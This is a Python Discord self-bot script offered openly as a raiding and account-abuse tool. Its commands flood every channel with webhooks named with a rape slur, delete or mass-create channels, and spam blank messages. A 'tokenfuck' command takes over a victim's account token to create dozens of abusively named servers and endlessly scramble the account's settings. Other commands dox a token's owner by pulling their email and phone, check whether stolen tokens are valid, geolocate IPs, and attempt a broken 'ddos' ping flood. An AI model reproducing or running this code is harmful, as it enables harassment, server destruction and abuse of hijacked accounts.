import colorama
from colorama import Fore, Style, init
import os
from discord.ext.commands import Bot
import discord
from discord.ext import commands, tasks
from urllib.parse import urlencode
import urllib.parse, urllib.request, requests, aiohttp
import re
import datetime
import asyncio
import base64
import random
import codecs
from itertools import cycle
from discord.utils import get
import string
import time
from discord_webhook import DiscordWebhook
import subprocess

####################CONFIG##############################
user_id = "705447011800973474"
stream_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
prefix = ">"
nitro_sniper = True #This is coming soon
############################################################
bot = commands.Bot(command_prefix=prefix, self_bot=True)
print(f"""
{Fore.BLUE}    
 
 ██████╗ ██████╗     ███████╗███████╗██╗     ███████╗██████╗  ██████╗ ████████╗
██╔════╝██╔════╝     ██╔════╝██╔════╝██║     ██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝
██║     ██║  ███╗    ███████╗█████╗  ██║     █████╗  ██████╔╝██║   ██║   ██║   
██║     ██║   ██║    ╚════██║██╔══╝  ██║     ██╔══╝  ██╔══██╗██║   ██║   ██║   
╚██████╗╚██████╔╝    ███████║███████╗███████╗██║     ██████╔╝╚██████╔╝   ██║   
 ╚═════╝ ╚═════╝     ╚══════╝╚══════╝╚══════╝╚═╝     ╚═════╝  ╚═════╝    ╚═╝   
                                                                                                                                   
                               Version V2       
                            Made by Axis/Marx
                            {Fore.BLUE}
                            {Fore.RESET}
""")
print(f"""
{Fore.YELLOW}    
Updates:
● Copy command will soon be able to back up roles and give channels their correct permissions.
● More raiding commands.
● Better utility commands.
● Nitro/Giveaway sniper.
● More customization.
{Fore.RESET}
""")
print(f"""
{Fore.GREEN}    
Info: For the selfbot to work, you need two other files for it to function. One will be ".env" which will contain your token. If you don't know how to get your token, watch this video: https://www.youtube.com/watch?v=VvCtWDQtz6A. To set it up, type "TOKEN = yourtoken". The second file will be "Friends.txt" this is the file your friend backup will be uploaded to. Version V3 will be coming soon.
{Fore.RESET}
""")
@bot.event
async def on_connect():
  print(f"""
  {Fore.WHITE}
  {Style.DIM}
  Logged in as: {bot.user.name} #{bot.user.discriminator}
  {Fore.RESET}
  """)
 
 
 
locales = [
   "da", "de",
   "en-GB", "en-US",
   "es-ES", "fr",
   "hr", "it",
   "lt", "hu",
   "nl", "no",
   "pl", "pt-BR",
   "ro", "fi",
   "sv-SE", "vi",
   "tr", "cs",
   "el", "bg",
   "ru", "uk",
   "th", "zh-CN",
   "ja", "zh-TW",
   "ko"
]
 
@bot.command(aliases=['webspam', 'webflood']) 
async def webhookspam(ctx):
 guild = ctx.message.guild
 while True:
  async with aiohttp.ClientSession() as session:
    with open(('jevil.png'), 'rb') as f:
      img = f.read()
    for channel in guild.channels:
      webhook = await channel.create_webhook(name='Get Raped',avatar=img)
      await webhook.send("kek")
      await webhook.delete()
    


@bot.command()
async def cd(ctx):
 guild = ctx.guild
 for channel in guild.channels:
   await channel.delete()
 
@bot.command(name='autobump', aliases=['bump'])
async def abump(ctx, channelid): # 
   await ctx.message.delete()
   count = 0
   while True:
       try:
           count += 1
           channel =  bot.get_channel(int(channelid))
           await channel.send('!d bump')          
           print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
           await asyncio.sleep(7200)
       except Exception as e:
           print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
 
@bot.command()
async def ddos(ip):
 target = input(ip)
 subprocess.run(['ping',target,'-l','65500','-w','1','-n','1'])
 bot.loop.create_task(ddos())
 subprocess.run2(['ping',target,'-l','65500','-w','1','-n','1'])
 bot.loop.create_task(ddos())
 subprocess.run3(['ping',target,'-l','65500','-w','1','-n','1'])
 bot.loop.create_task(ddos())
 #work in progess
 
def randomString(stringLength=30):
   main = string.ascii_letters
   return ''.join(random.choice(main) for i in range(stringLength))
@bot.command()
async def cc(ctx):
 guild = ctx.guild
 amount = 250
 for i in range(amount):
   await guild.create_text_channel(name=randomString(30))
 
@bot.command()
async def serverinfo(ctx):
 guild = ctx.message.guild
 roles = [role for role in guild.roles]
 channels = [channel for channel in guild.channels]
 categories = [category for category in guild.categories]
 embed = discord.Embed(colour=0Xff0000, timestamp=ctx.message.created_at)
 embed.set_author(name=f"{guild.name}")
 embed.add_field(name=f"**Member Count:**", value=f"{guild.member_count}", inline=False)
 embed.add_field(name=f"**Role Count:**", value=f"{len(roles)}", inline=False)
 embed.add_field(name=f"**Channel Count:**", value=f"{len(channels)}", inline=False)
 embed.add_field(name=f"**Category Count:**", value=f"{len(categories)}", inline=False)
 embed.add_field(name=f"**Guild Region:**", value=f"{guild.region}", inline=False)
 embed.add_field(name=f"**Owner:**", value=f"{guild.owner}", inline=False)
 embed.set_thumbnail(url=guild.icon_url)
 await ctx.send(embed=embed)
 
@bot.command()
async def slowmode(ctx, delay):
 while True:
   try:
     await ctx.channel.edit(slowmode_delay = delay)
     print(f"{Fore.GREEN}Slowmode delay set to {delay} seconds.{Fore.RESET}")
     break
   except:
     print(f"{Fore.RED}Missing permissions.{Fore.RESET}")
     break
 #chaotic command btw (just edited)
 
@bot.command()
async def clear(ctx):
         channel = ctx.message.channel
         messages = await channel.history(limit=None).flatten()
         for message in messages:
           if message.author == bot.user:
             try:
               await message.delete()
             except:
               pass
@bot.command(aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'): # 
   await ctx.message.delete()
   r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
   geo = r.json()
   em = discord.Embed()
   fields = [
       {'name': 'IP', 'value': geo['query']},
       {'name': 'IP Type', 'value': geo['ipType']},
       {'name': 'Country', 'value': geo['country']},
       {'name': 'City', 'value': geo['city']},
       {'name': 'Continent', 'value': geo['continent']},
       {'name': 'IPName', 'value': geo['ipName']},
       {'name': 'ISP', 'value': geo['isp']},
       {'name': 'Latitute', 'value': geo['lat']},
       {'name': 'Longitude', 'value': geo['lon']},
       {'name': 'Region', 'value': geo['region']},
   ]
   for field in fields:
       if field['value']:
           em.add_field(name=field['name'], value=field['value'], inline=True)
   return await ctx.send(embed=em)
 
@bot.command(aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def backup(ctx): # 
   await ctx.message.delete()
   for friend in bot.user.friends:
      friendlist = (friend.name)+'#'+(friend.discriminator)
      with open('Friends.txt', 'a+') as f:
          f.write(friendlist+"\n" )
 
 
@bot.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token): #  
   await ctx.message.delete() 
   headers = {
       'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
       'Content-Type': 'application/json',
       'Authorization': _token,
   }
   request = requests.Session()
   payload = {
       'theme': "light",
       'locale': "ja",
       'message_display_compact': False,
       'inline_embed_media': False,
       'inline_attachment_media': False,
       'gif_auto_play': False,
       'render_embeds': False,
       'render_reactions': False,
       'animate_emoji': False,
       'convert_emoticons': False,
       'enable_tts_command': False,
       'explicit_content_filter': '0',
       'status': "invisible"
   }
   guild = {
       'channels': None,
       'icon': None,
       'name': "RAPED BY CHAOS GANG",
       'region': "Hong Kong"
   }
   for _i in range(50):
       requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
   while True:
       try:
           request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
       except Exception as e:
           print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
       else:
           break
   modes = cycle(["light", "dark"])
   statuses = cycle(["online", "idle", "dnd", "invisible"])
   while True:
       setting = {
           'theme': next(modes),
           'locale': random.choice(locales),
           'status': next(statuses)
       }
       while True:
           try:
               request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
           except Exception as e:
               print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
           else:
               break  
 
@bot.command(aliases=['tokinfo', 'tdoxx'])
async def tokeninfo(ctx, _token): # 
   await ctx.message.delete()
   headers = {
       'Authorization': _token,
       'Content-Type': 'application/json'
   }     
   try:
       res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
       res = res.json()
       user_id = res['id']
       avatar_id = res['avatar']
       creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
   except:
       print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
   em = discord.Embed(
       description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
   fields = [
       {'name': 'Phone', 'value': res['phone']},
       {'name': 'Flags', 'value': res['flags']},
       {'name': 'MFA?', 'value': res['mfa_enabled']},
       {'name': 'Verified?', 'value': res['verified']},
   ]
   for field in fields:
       if field['value']:
           em.add_field(name=field['name'], value=field['value'], inline=False)
           em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
   return await ctx.send(embed=em)
@bot.command(pass_context=True)
async def ping(ctx):
  channel = ctx.message.channel
  t1 = time.perf_counter()
  await channel.trigger_typing()
  t2 = time.perf_counter()
  embed=discord.Embed(title=None, description='<:ping:719289854038376578> Ping: {}ms'.format(round((t2-t1)*1000)), color=0xafe4f1)
  await channel.send(embed=embed)    
 
@bot.command()
async def encode(ctx, *, string): # 
   await ctx.message.delete()
   decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
   encoded_stuff = str(decoded_stuff)
   encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
   await ctx.send(encoded_stuff)
 
@bot.command()
async def decode(ctx, *, string): #  +
   await ctx.message.delete() 
   strOne = (string).encode("ascii")
   pad = len(strOne)%4
   strOne += b"="*pad
   encoded_stuff = codecs.decode(strOne.strip(),'base64')
   decoded_stuff = str(encoded_stuff)
   decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
   await ctx.send(decoded_stuff)
 
@bot.command()
async def copy(ctx): # 
   await ctx.message.delete()
   await bot.create_guild(f'backup-{ctx.guild.name}')
   await asyncio.sleep(4)
   for g in bot.guilds:
       if f'backup-{ctx.guild.name}' in g.name:
           for c in g.channels:
               await c.delete()
           for cate in ctx.guild.categories:
               x = await g.create_category(f"{cate.name}")
               for chann in cate.channels:
                   if isinstance(chann, discord.VoiceChannel):
                       await x.create_voice_channel(f"{chann}")
                   if isinstance(chann, discord.TextChannel):
                       await x.create_text_channel(f"{chann}")
 
 
 
   try:               
       await g.edit(icon=ctx.guild.icon_url)
   except:
       pass
 
@bot.command()
async def listening(ctx, *, message): # 
   await ctx.message.delete()
   await bot.change_presence(
       activity=discord.Activity(
           type=discord.ActivityType.listening,
           name=message,
       ))
 
@bot.command()
async def watching(ctx, *, message): # 
   await ctx.message.delete()
   await bot.change_presence(
       activity=discord.Activity(
           type=discord.ActivityType.watching,
           name=message
       ))
 
@bot.command()
async def streaming(ctx, *, message): # 
   await ctx.message.delete()
   stream = discord.Streaming(
       name=message,
       url=stream_url,
   )
   await bot.change_presence(activity=stream)
 
@bot.command()
async def playing(ctx, *, message): # 
   await ctx.message.delete()
   game = discord.Game(
       name=message
   )
   await bot.change_presence(activity=game)


@bot.command()
async def ascii(ctx, *, text): # 
   await ctx.message.delete()
   r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
   if len('```'+r+'```') > 2000:
       return
   await ctx.send(f"```{r}```")
 
@bot.command()
async def blankbomb(ctx): # 
   await ctx.message.delete()
   await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')
 
@bot.command(pass_context=True)
async def avatar(ctx, member: discord.Member):
 member = ctx.author if not member else member
 
 embed = discord.Embed(colour=member.color, timestamp=ctx.message.created_at)
 embed.set_author(name=f"Avatar for {member}")
 embed.set_thumbnail(url=member.avatar_url)
 await ctx.send(embed=embed)

 
token = os.getenv("TOKEN")
 
@bot.command()
async def tokencheck(ctx, gk):
 headers={
    'Authorization': gk # I'll soon be adding support for bulk checking.
 }
 src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
 try:
    if src.status_code == 200:
        print(f'{Fore.GREEN}Token Works.{Fore.RESET}')
    else:
        print(f'{Fore.RED}Invalid Token.{Fore.RESET}')
 except Exception:
    print("Unable to connect to discorapp.com")   
 
bot.run(token, bot=False)

